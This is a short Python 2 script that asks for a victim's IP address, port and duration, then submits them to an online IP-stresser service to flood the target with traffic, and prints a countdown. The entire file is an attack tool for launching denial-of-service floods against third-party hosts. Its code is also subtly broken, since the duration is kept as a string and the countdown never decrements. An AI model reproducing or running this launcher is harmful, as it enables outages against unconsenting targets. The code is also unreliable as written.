from termcolor import colored
import urllib2
import urllib
import time
ip=raw_input("Insert victim's ip: ")
port=raw_input("Isert the port: ")
sec=raw_input("Insert time of attack[max 300]: ")
atk=colored("[]THE ATTACK HAS BEEN STARTED...", "green")
url="http://freeipstress.com"
params=urllib.urlencode([("StresstestRequests[target_ip]", str(ip)),("StresstestRequests[target_port]", str(port)),("StresstestRequests[time_in_seconds]",str(sec))])
urllib2.urlopen(url,params)
print(atk)
i=sec
for x in range(0,sec):
    time.sleep(1)
    g=colored("SECONDS REMAINING:", "green")
    h=sec-1
    f=str(h)
    o=colored(f,"red")
    print(g+o)
